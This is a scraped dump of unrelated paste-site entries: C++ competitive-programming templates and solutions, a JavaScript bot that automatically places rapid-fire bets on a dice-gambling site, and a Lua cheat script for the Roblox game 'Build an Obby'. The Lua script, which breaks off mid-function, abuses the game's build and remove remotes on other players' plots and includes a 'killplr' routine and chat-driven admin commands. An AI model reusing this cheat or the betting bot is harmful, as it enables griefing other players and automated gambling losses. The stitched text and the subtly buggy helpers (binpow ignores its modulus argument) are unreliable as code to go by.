#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define traverse(i, a) for (auto i : a)
#define set_bits(x) __builtin_popcountll(x)
#define leading_zero(x) __builtin_clz(x)
#define trailing_zero(x) __builtin_ctz(x)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define MOD 1000000007
#define endl '\n'

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x) \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

const int N = 2e5;

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}

template <typename T>
void input(vector<T> &v)
{
    f(i, 0, (int)v.size()) cin >> v[i];
}

template <typename T>
void input(T &a)
{
    cin >> a;
}

template <typename T>
void print(vector<T> &v)
{
    f(i, 0, (int)v.size()) cout << v[i] << ' ';
    cout << endl;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
// vb sieve(N + 5, true);
// vi primes;
// void gensieve()
// {
//     sieve[0] = sieve[1] = false;
//     for (int i = 2; i <= sqrt(N); i++)
//     {
//         if (sieve[i])
//         {
//             for (int j = i * i; j <= N; j += i)
//                 sieve[j] = false;
//         }
//     }
//     for (int i = 2; i <= N; i++)
//     {
//         if (sieve[i])
//             primes.pb(i);
//     }
// }
////////////////////////////////

int binpow(int a, int b, int m)
{
    a %= m;
    int ans = 1;
    while (b > 0)
    {
        if (b & 1)
        {
            ans = (ans * a) % MOD;
        }
        a = (a * a) % MOD;
        b >>= 1;
    }
    return ans;
}

int modadd(int a, int b)
{
    return (a % MOD + b % MOD) % MOD;
}
int modsub(int a, int b)
{
    return ((a % MOD - b % MOD) % MOD + MOD) % MOD;
}
int modmul(int a, int b)
{
    return (a % MOD * b % MOD) % MOD;
}
int moddiv(int a, int b)
{
    return ((a % MOD) * (binpow(b, MOD - 2, MOD))) % MOD;
}

int lbnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] <= x)
        {
            ans = mid;
            low = mid + 1;
        }
        else
        {
            high = mid - 1;
        }
    }
    return ans;
}

int ubnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] >= x)
        {
            ans = mid;
            high = mid - 1;
        }
        else
        {
            low = mid + 1;
        }
    }
    return ans;
}

vpi moves = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}};
// vi graph[N + 1];
// vb visited(N + 1, false);
// vi parent(N + 1, -1);
// vi level(N + 1, 0);

// void bfs(vi *graph, vb &visited, vi &parent, vi &level, int start)
// {
//     queue<int> q;
//     visited[start] = true;
//     q.push(start);
//     while (!q.empty())
//     {
//         int node = q.front();
//         traverse(i, graph[node])
//         {
//             if (!visited[i])
//             {
//                 if (parent[i] == -1)
//                     parent[i] = node;
//                 if (level[i] == 0)
//                     level[i] = 1 + level[node];
//                 visited[i] = true;
//                 q.push(i);
//             }
//         }
//         q.pop();
//     }
// }

// void dfs(vi *graph, vb &visited, int start)
// {
//     visited[start] = true;
//     traverse(i, graph[start])
//     {
//         if (!visited[i])
//         {
//             visited[i] = true;
//             dfs(graph, visited, i);
//         }
//     }
// }

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

int x = 0;

bool isValid(int a, int b, int n)
{
    return ((a < n && a >= 0) && (b < n && b >= 0));
}


int dfs(vector<vi> &grid, vector<vb> &visited, int a, int b)
{
    visited[a][b] = true;
    int ans = 1;

    for (auto i : moves)
    {
        int x = a + i.F;
        int y = b + i.S;
        if (isValid(x, y, grid.size()))
            if (!visited[x][y])
            {
                ans = 1 + dfs(grid, visited, x, y);
            }
    }
    return ans;
}

void solve()
{
    int n, a, b;
    cin >> n >> a >> b;
    a--;
    b--;

    vector<vi> grid(n, vi(n));
    vector<vb> visited(n, vb(n, false));

    int ans = 1;

    for (auto i : moves)
    {
        if (isValid(a + i.F, b + i.S, n))
            ans = max(ans, dfs(grid, visited, a + i.F, b + i.S));
        f(i, 0, n)
        {
            f(j, 0, n)
            {
                visited[i][j] = false;  
            }
        }
    }
    println(ans);
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    cin >> t;
    // gensieve();
    while (t--)
    {
        solve();
    }
    return 0;
}"
mqdQT9jd,snowy awesome,coinwalk,JavaScript,Saturday 19th of August 2023 10:54:00 AM CDT,"var kozster = parseFloat($('#pct_balance').val());
var brick = kozster;
var gobbie = kozster/240; //basebet;
var zeggar = gobbie;
var target = 350;
var tens = (gobbie*10);
var sevens = (gobbie*6.9);
var tuba = ((Math.floor(kozster/tens))*tens);
var bitz = kozster;
var burgzie = kozster;
var belcom = kozster;
var love = kozster;
var lolz = gobbie*1000;
var bone = (((Math.floor(kozster/tens))*tens)-(tens*2));
var tubist = ((Math.floor(kozster/tens))*tens);
var razzle;
var zen = 0;
var upper = 6.9;
var lower = 2.9;
var junky = kozster;
var bonie = kozster;
var adst = (gobbie*1000).toPrecision(1).toString();
var blade = adst.length+1;
var joe = $($(""#me>div>.betid"")[0]).text();
var boggart = 0;
var bear = true;
var oldDegen = 0;
 
function dobet(){
burgzie = $('#pct_balance').val();
if (burgzie>(tuba+(zeggar*upper))){
    zeggar = zeggar*2;
    upper = 4.9;
    lower = 4.9;
    tuba = parseFloat(burgzie);
}
if (burgzie<(tuba-(zeggar*lower))){
    zeggar = zeggar*2;
    upper = 4.9;
    lower = 4.9;
    tuba = parseFloat(burgzie);
}
if (((burgzie-(zeggar*40)<=0)&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens)))||((zeggar>=(kozster/20))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens)))){
    zeggar = gobbie;
    upper = 6.9;
    lower = 2.9;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
return ((zeggar*1).toFixed(8));
}
 
function go(){
var xox = $('#pct_balance').val();
razzle = dobet();
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo')[0].click();
console.log(""snowybot active"");
if (xox>=target) {
console.log(""snowybot rocks target done"");
return;
}
setTimeout(() => go(), 1);
}
go();
 "
nKheFj3Z,Untitled,Sreekar_0125,C++,Saturday 19th of August 2023 10:43:10 AM CDT,"#include <bits/stdc++.h>
using namespace std;
// #define cerr if(false)cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define traverse(i, a) for (auto i : a)
#define set_bits(x) __builtin_popcountll(x)
#define leading_zero(x) __builtin_clz(x)
#define trailing_zero(x) __builtin_ctz(x)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define MOD 1000000007
#define endl '\n'

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x)              \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

const int N = 1e6;

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}

template <typename T>
void input(vector<T> &v)
{
    f(i, 0, (int)v.size()) cin >> v[i];
}

template <typename T>
void input(T &a)
{
    cin >> a;
}

template <typename T>
void print(vector<T> &v)
{
    f(i, 0, (int)v.size()) cout << v[i] << ' ';
    cout << endl;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
vb sieve(N + 5, true);
vi primes;
void gensieve()
{
    sieve[0] = sieve[1] = false;
    for (int i = 2; i <= sqrt(N); i++)
    {
        if (sieve[i])
        {
            for (int j = i * i; j <= N; j += i)
                sieve[j] = false;
        }
    }
    for (int i = 2; i <= N; i++)
    {
        if (sieve[i])
            primes.pb(i);
    }
}
////////////////////////////////

int binpow(int a, int b, int m)
{
    a %= m;
    int ans = 1;
    while (b > 0)
    {
        if (b & 1)
        {
            ans = (ans * a) % MOD;
        }
        a = (a * a) % MOD;
        b >>= 1;
    }
    return ans;
}

int modadd(int a, int b)
{
    return (a % MOD + b % MOD) % MOD;
}
int modsub(int a, int b)
{
    return ((a % MOD - b % MOD) % MOD + MOD) % MOD;
}
int modmul(int a, int b)
{
    return (a % MOD * b % MOD) % MOD;
}
int moddiv(int a, int b)
{
    return ((a % MOD) * (binpow(b, MOD - 2, MOD))) % MOD;
}

int lbnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] <= x)
        {
            ans = mid;
            low = mid + 1;
        }
        else
        {
            high = mid - 1;
        }
    }
    return ans;
}

int ubnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] >= x)
        {
            ans = mid;
            high = mid - 1;
        }
        else
        {
            low = mid + 1;
        }
    }
    return ans;
}

// vpi moves = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}, {1, 1}, {1, -1}, {-1, 1}, {-1, -1}};
// vi graph[N + 1];
// vb visited(N + 1, false);
// vi parent(N + 1, -1);
// vi level(N + 1, 0);

// void bfs(vi *graph, vb &visited, vi &parent, vi &level, int start)
// {
//     queue<int> q;
//     visited[start] = true;
//     q.push(start);
//     while (!q.empty())
//     {
//         int node = q.front();
//         traverse(i, graph[node])
//         {
//             if (!visited[i])
//             {
//                 if (parent[i] == -1)
//                     parent[i] = node;
//                 if (level[i] == 0)
//                     level[i] = 1 + level[node];
//                 visited[i] = true;
//                 q.push(i);
//             }
//         }
//         q.pop();
//     }
// }

// void dfs(vi *graph, vb &visited, int start)
// {
//     visited[start] = true;
//     traverse(i, graph[start])
//     {
//         if (!visited[i])
//         {
//             visited[i] = true;
//             dfs(graph, visited, i);
//         }
//     }
// }

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

void solve()
{
    int n;
    cin >> n;

    vi v(n);
    input(v);

    vi prefix = v;
    vi suffix = v;

    reverse(all(suffix));

    f(i, 1, n)
    {
        prefix[i] = __gcd(prefix[i - 1], prefix[i]);
        suffix[i] = __gcd(suffix[i - 1], suffix[i]);
    }

    reverse(all(suffix));
    debug(prefix);
    debug(suffix);

    vi nums;
    nums.pb(suffix[1]);

    for(int i = 1; i <= n - 2; i++)
    {
        int x = __gcd(prefix[i - 1], suffix[i + 1]);
        nums.pb(x);
    }

    nums.pb(prefix[n - 2]);

    debug(nums);
    int mini = LLONG_MAX;

    f(i, 0, n)
    {
        if(sieve[nums[i]])
        {
            mini = min(mini, 1LL);
            continue;
        }

        int cnt = 0;

        int x = nums[i];
        int limit = sqrt(x);

        for(auto p: primes)
        {
            if(p > limit) break;
            while(x % p == 0) 
            {
                x /= p;
                cnt++;
            }
        }

        mini = min(mini, cnt);
    }
    dbg(mini);
    if(mini >= 2) println(""BOB"");
    else println(""DRAW"");
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    cin >> t;
    gensieve();
    while (t--)
    {
        solve();
    }
    return 0;
}
"
esix9dbV,Build an Obby ADMIN REMAKE,2AreYouMental110,Lua,Saturday 19th of August 2023 10:33:47 AM CDT,"-- https://www.roblox.com/games/1526094849/Build-an-Obby
local autowhitelistfriends = false
local prefix = "".""
local prefix2 = "".""
local delaybeforedelete = 1
local successmessage = ""Success""
local whitelistmessage = ""You have been whitelisted, do ""..prefix2..""cmds for the cmds""
local autowhitelistmessage = ""You have been automatically whitelisted, do ""..prefix2..""cmds for the cmds""
local unwhitelistmessage = ""Admin has ended, wait for the owner to re-whitelist you.""
local canwhitelistmessage = ""You have been granted permission to whitelist/unwhitelist anyone!""
local costmoney = false
local enablerconsole = false
local usedobbies = {}
local press2kill = false
local press4obby = false
local inputbegan


local localplr = game.Players.LocalPlayer
local wl = {}
local otherplrmessage
local localplrmessage
local cmds = {}
local cmddesc = {}
cmddesc[""premadeobbies""] = ""ladder, free money obby v2, free money obby v2 (20 obby version), free money obby, ladder, bruh""
local localplrtable = {}
local supportgetgenv = false
local supportfiles = false
local supportsrconsole = false
function notify(title,text)
    if text then
        game:GetService(""StarterGui""):SetCore(""SendNotification"",{Title=title,Text=text})
    else
        game:GetService(""StarterGui""):SetCore(""SendNotification"",{Title=title,Text=title})
    end
end
notify(""Starting Script.."")
local premadeobbies = {}
premadeobbies[""alexobby""] = workspace.TyleObbys.Alexobby.end1
premadeobbies[""vid_boy""] = workspace.TyleObbys[""Vid_Boy""].vidboy.End
premadeobbies[""blue_cave""] = workspace.TyleObbys[""Blue_Cave""][""Blue_cave""].End
premadeobbies[""lemon_obby""] = workspace.TyleObbys[""lemon_Obby""][""Lemon Obby""].Finnish
premadeobbies[""cyber obby""] = game:GetService(""Workspace"").TyleObbys[""Cyber Obby""][""Cyber Obby""][""End! (Needs to be scripted!)""]
premadeobbies[""skechobby""] = game:GetService(""Workspace"").TyleObbys.skechobby.end1
premadeobbies[""denisobby""] = game:GetService(""Workspace"").TyleObbys.denisobby.end1
premadeobbies[""subobby""] = game:GetService(""Workspace"").TyleObbys.SubObby.end1
premadeobbies[""hacker obby""] = game:GetService(""Workspace"").FireObbys[""Hacker Obby""].Finish
premadeobbies[""mountain obby""] = game:GetService(""Workspace"").FireObbys[""Mountain Obby""].Finish
premadeobbies[""lazer obby""] = game:GetService(""Workspace"").FireObbys[""Lazer Obby""].Finish
premadeobbies[""lava obby""] = game:GetService(""Workspace"").FireObbys[""Lava Obby""].Finish
premadeobbies[""blueaura obby""] = game:GetService(""Workspace"").FireObbys[""BlueAura Obby""].Finish

function endfunc()
    print(endfunc)
end
function add()
    print(add)
end
function updatewhitelistmessage()
    whitelistmessage = ""You have been whitelisted, do ""..prefix2..""cmds for the cmds""
    autowhitelistmessage = ""You have been automatically whitelisted, do ""..prefix2..""cmds for the cmds""
    if supportgetgenv then
        getgenv().whitelistmessage = whitelistmessage
        getgenv().autowhitelistmessage = autowhitelistmessage
    end
end
function splittext(txt)
    local txttable = {}
    if string.len(txt) < 200 then
        return {txt}
    else
        repeat
            wait()
            local str = string.sub(txt,1,175)
            table.insert(txttable,str)
            txt = string.sub(txt,176)
        until string.len(txt) < 175
        table.insert(txttable,txt)
        return txttable
    end
end
local success,err = pcall(function()
    if typeof(getgenv()) == ""table"" then
        supportgetgenv = true
    end
end)
local success,err = pcall(function()
    if typeof(appendfile) == ""function"" and typeof(writefile) == ""function"" then
        supportfiles = true
    end
end)
local success,err = pcall(function()
    if typeof(rconsoleprint) == ""function"" then
        supportsrconsole = true
    end
end)
if supportgetgenv then
    if getgenv().endfunc then
        notify(""Closing out of other script.."")
        getgenv().endfunc()
    end
    if getgenv().prefix then
        prefix = getgenv().prefix
    end
    getgenv().prefix = prefix
    if getgenv().prefix2 then
        prefix2 = getgenv().prefix2
        updatewhitelistmessage()
    end
    getgenv().prefix2 = prefix2
    if getgenv().costmoney then
        costmoney = getgenv().costmoney
    end
    getgenv().costmoney = costmoney
    if getgenv().farmlevels then
        farmlevels = getgenv().farmlevels
    end
    getgenv().enablerconsole = enablerconsole
    if getgenv().enablerconsole then
        enablerconsole = getgenv().enablerconsole
    end
    getgenv().enablerconsole = enablerconsole
    if getgenv().whitelistmessage then
        whitelistmessage = getgenv().whitelistmessage
    end
    getgenv().whitelistmessage = whitelistmessage
    if getgenv().unwhitelistmessage then
        unwhitelistmessage = getgenv().unwhitelistmessage
    end
    getgenv().unwhitelistmessage = unwhitelistmessage
    if getgenv().canwhitelistmessage then
        canwhitelistmessage = getgenv().canwhitelistmessage
        getgenv().canwhitelistmessage = canwhitelistmessage
    end
    getgenv().canwhitelistmessage = canwhitelistmessage
    if getgenv().autowhitelistfriends then
        autowhitelistfriends = getgenv().autowhitelistfriends
    end
    getgenv().autowhitelistfriends = autowhitelistfriends
    if getgenv().autowhitelistmessage then
        autowhitelistmessage = getgenv().autowhitelistmessage
    end
    getgenv().autowhitelistmessage = autowhitelistmessage
end
if supportfiles then
    add = function(strings,file)
        appendfile(file,tostring(strings))
        appendfile(file,[[
    
    ]])
    end
    writefile(""buildanobbystats.lua"","""")
end
if supportsrconsole and enablerconsole then
    rconsoleclear()
    rconsolename(""Build an Obby"")
    rconsoleprint(""@@LIGHT_BLUE@@"")
rconsoleprint([[
Credits: https://www.youtube.com/watch?v=B87hxW_vMJI
some part of the whitelist section by infinite yield

Current Cmds:

end (no prefix) - ends the whole thing

]])
else
print([[
Credits: https://www.youtube.com/watch?v=B87hxW_vMJI
some part of the whitelist section by infinite yield

Current Cmds:

end (no prefix) - ends the whole thing

]])
end
function sayto(plrname,text)
    print(plrname,text)
    if plrname == localplr.Name then
        notify(text)
    else
        print(""/w ""..plrname.."" ""..text)
        game:GetService(""ReplicatedStorage"").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""/w ""..plrname.."" ""..text,""All"")
    end
end
function success(plrname,text)
    if plrname:lower() == localplr.Name:lower() then
        if text then
            notify(successmessage,text)
        else
            notify(successmessage)
        end
    else
        sayto(plrname,successmessage)
    end
end
function makecmd(cmdname,description,whitelist,needsargs,func)
    cmds[cmdname] = {whitelist,needsargs,func}
    cmddesc[cmdname] = description
end
function findobj(txt,parent)
    for i,v in pairs(parent:GetChildren()) do
        if v.Name:lower() == txt then
            return v
        end
    end
    for i,v in pairs(parent:GetChildren()) do
        if string.sub(v.Name,1,string.len(txt)) == txt then
            return v
        end
    end
    for i,v in pairs(parent:GetChildren()) do
        if string.find(v.Name:lower(),txt:lower()) then
            return v
        end
    end
    return false
end
function getplayer(txt,player)
    if not txt or not player then return nil end
    if txt == ""all"" then
        return game.Players:GetPlayers()
    elseif txt == ""others"" then
        local plrs = {}
        for i,v in pairs(game.Players:GetPlayers()) do
            if v ~= player then
                table.insert(plrs,v)
            end
        end
        return plrs
    elseif txt == ""me"" then
        return player
    elseif txt == ""random"" then
        return game.Players:GetPlayers()[math.random(1,#game.Players:GetPlayers())]
    else
        for i,v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower() == txt then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if string.sub(v.Name,1,string.len(txt)) == txt then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if string.find(v.Name,txt) then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if v.DisplayName:lower() == txt then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if string.sub(v.DisplayName,1,string.len(txt)) == txt then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if string.find(v.DisplayName,txt) then
                return v
            end
        end
    end
    return nil
end
function combineargs(args)
    for i,v in pairs(args) do
        if i > 1 then
            args[1] = args[1].."" ""..v
        end
    end
    return args
end
function findobby()
    local obbies = {}
    for i,v in pairs(workspace.Terrain.Obbyplot:GetChildren()) do
        if not usedobbies[v.Name] and v:FindFirstChild(""Obby"") and #v.Obby:GetChildren() < v.values.maxobbys.Value-1 then
            obbies[v.Name] = #v.Obby:GetChildren()
        end
    end
    local best = nil
    for i,v in pairs(obbies) do
        if not best then
            best = {i,v}
        elseif best and best[2] > v then
            best = {i,v}
        end
    end
    if best then
        return best[1]
    end
    return nil
end
function placeobbypos(pos,obby)
    local plrobby = findobby()
    if plrobby then
        usedobbies[plrobby] = true
        local plrobbyinst = workspace.Terrain.Obbyplot[plrobby]
        local amount = #plrobbyinst.Obby:GetChildren()
        if amount == 0 then
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(obby,plrobby,0,0,-5,costmoney)
        end
        local nextobbypos = Vector3.new(0,0,0)
        local biggestid = 0
        for i,v in pairs(plrobbyinst.Obby:GetChildren()) do
            if v.ID.Value > biggestid then
                biggestid = v.ID.Value
                nextobbypos = v:GetPivot().Position
            end
        end
        if nextobbypos ~= Vector3.new(0,0,0) then
            local obbysize = game.ReplicatedStorage.obys[obby]:GetExtentsSize()
            nextobbypos += Vector3.new(obbysize)
            local diff = (nextobbypos - pos).Magnitude
            local lookat = CFrame.lookAt(nextobbypos,pos)
            lookat -= lookat.Position
            lookat += Vector3.new(0,0,obbysize.Z*1.35)
            lookat *= CFrame.new(0,0,-diff)
            local finalpos = lookat.Position
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(obby,plrobby,finalpos.X,finalpos.Y,finalpos.Z,costmoney)
            delay(delaybeforedelete,function()
                game:GetService(""ReplicatedStorage"").removeobby:InvokeServer((#game.Workspace.Terrain.Obbyplot[plrobby].Obby:GetChildren()),plrobby,0,0,-5,true)
                game:GetService(""ReplicatedStorage"").removeobby:InvokeServer((#game.Workspace.Terrain.Obbyplot[plrobby].Obby:GetChildren()),plrobby,0,0,-5,true)
                usedobbies[plrobby] = nil
            end)
        else
            usedobbies[plrobby] = nil
        end
    end
end
function killplr(playertokill)
    local char
    if not playertokill.Character then
        char = playertokill.CharacterAdded:Wait()
    else
        char = playertokill.Character
    end
    char:WaitForChild(""HumanoidRootPart"",math.huge)
    local pos = char.HumanoidRootPart.Position
    placeobbypos(pos,""chocolate20"")
end
--[[function getplayerwhitelisted(txt,player) unused
    local plrs = getplayer(txt,player)
    if typeof(plrs) == ""table"" then
        local newplrs = {}
        for i,v in pairs(plrs) do
            if wl[plrs.Name] then
                table.insert(newplrs,v)
            end
        end
    else
        if wl[plrs.Name] then
            return plrs
        end
    end
    return nil
end]]
function getplrtable(plr)
    if plr ~= localplr.Name then
        return wl[plr]
    else
        return localplrtable
    end
    return nil
end
makecmd(""selectplrobby"",""Selects a player's obby by its color. Example: selectplrobby Red"",true,true,function(plr,args)
    args = combineargs(args)
    local obby = findobj(args[1],workspace.Terrain.Obbyplot)
    local plrtable = getplrtable(plr)
    if obby and plrtable then
        plrtable.plrobby = obby.Name
        success(plr,obby:GetFullName())
    end
end)
makecmd(""selectobby"",""Selects an obby you can build, Example: selectobby Golden Goat Troll"",true,true,function(plr,args)
    args = combineargs(args)
    local obby = findobj(args[1],game.ReplicatedStorage.obys)
    local plrtable = getplrtable(plr)
    if obby and plrtable then
        plrtable.obby = obby.Name
        success(plr,obby:GetFullName())
    end
end)
makecmd(""buildobby"",""Build the obby, You need to have used selectobby and selectplrobby."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby and plrtable.obby then
        game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(plrtable.obby,plrtable.plrobby,0,0,-5,costmoney)
        success(plr)
    end
end)
makecmd(""selectxyz"",""Select an x,y,z by number, Example: selectxyz 1 1 1"",true,true,function(plr,args)
    local plrtable = getplrtable(plr)
    if args[1] and args[2] and args[3] and not string.find(args[1],""#"") and not string.find(args[2],""#"") and not string.find(args[3],""#"") then
        plrtable.x,plrtable.y,plrtable.z = args[1],args[2],args[3]
        success(plr)
    end
end)
makecmd(""buildobbyxyz"",""Build the obby using x,y,z, You need to have used selectobby, selectplrobby, and selectxyz."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.x and plrtable.y and plrtable.z then
        game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(plrtable.obby,plrtable.plrobby,plrtable.x,plrtable.y,plrtable.z,costmoney)
        success(plr)
    end
end)
makecmd(""whitelist"",""The whitelist command. Example: whitelist AreYouMental110"",true,true,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable ~= localplrtable then
        if not plrtable.canwhitelist then
            return
        end
    end
    local plr2 = getplayer(args[1],plr)
    if plr2 then
        local successful = false
        if typeof(plr2) == ""table"" then
            for i,v in pairs(plr2) do
                if not wl[v.Name] then
                    sayto(v.Name,whitelistmessage)
                    wl[v.Name] = {}
                end
            end
            successful = true
        else
            if not wl[plr2.Name] then
                sayto(plr2.Name,whitelistmessage)
                wl[plr2.Name] = {}
                successful = true
            else
                notify(""Already whitelisted ""..plr2.Name..""!"")
            end
        end
        if successful then
            success(plr)
        end
    end
end)
makecmd(""unwhitelist"",""The Unwhitelist command. Example: unwhitelist AreYouMental110"",true,true,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable ~= localplrtable then
        if not plrtable.canwhitelist then
            return
        end
    end
    local plr2 = getplayer(args[1],plr)
    if plr2 then
        local successful = false
        if typeof(plr2) == ""table"" then
            for i,v in pairs(plr2) do
                if wl[v.Name] then
                    sayto(v.Name,unwhitelistmessage)
                    wl[v.Name] = nil
                end
            end
            successful = true
        else
            if wl[plr2.Name] then
                sayto(plr2.Name,unwhitelistmessage)
                wl[plr2.Name] = nil
                successful = true
            end
        end
        if successful then
            success(plr)
        end
    end
end)
makecmd(""canwhitelist"",""Makes a person able to whitelist/unwhitelist, Example: canwhitelist AreYouMental110"",false,true,function(plr,args)
    local plrs = getplayer(args[1],plr)
    if plrs then
        if typeof(plrs) == ""table"" then
            for i,v in pairs(plrs) do
                local plrtable = getplrtable(v.Name)
                if plrtable then
                    plrtable.canwhitelist = true
                    sayto(v.Name,canwhitelistmessage)
                else
                    wl[v.Name] = {}
                    wl[v.Name].canwhitelist = true
                    sayto(v.Name,canwhitelistmessage)
                end
            end
            success(plr)
        else
            local plrtable = getplrtable(plrs.Name)
            if plrtable then
                plrtable.canwhitelist = true
                sayto(plrs.Name,canwhitelistmessage)
                success(plr)
            else
                wl[plrs.Name] = {}
                wl[plrs.Name].canwhitelist = true
                sayto(plrs.Name,canwhitelistmessage)
                success(plr)
            end
        end
    end
end)
makecmd(""deletefirstobby"",""Deletes the first obby. You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").removeobby:InvokeServer(1,plrtable.plrobby,0,0,-5,true)
        success(plr)
    end
end)
makecmd(""deletelastobby"",""Deletes the last obby. You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
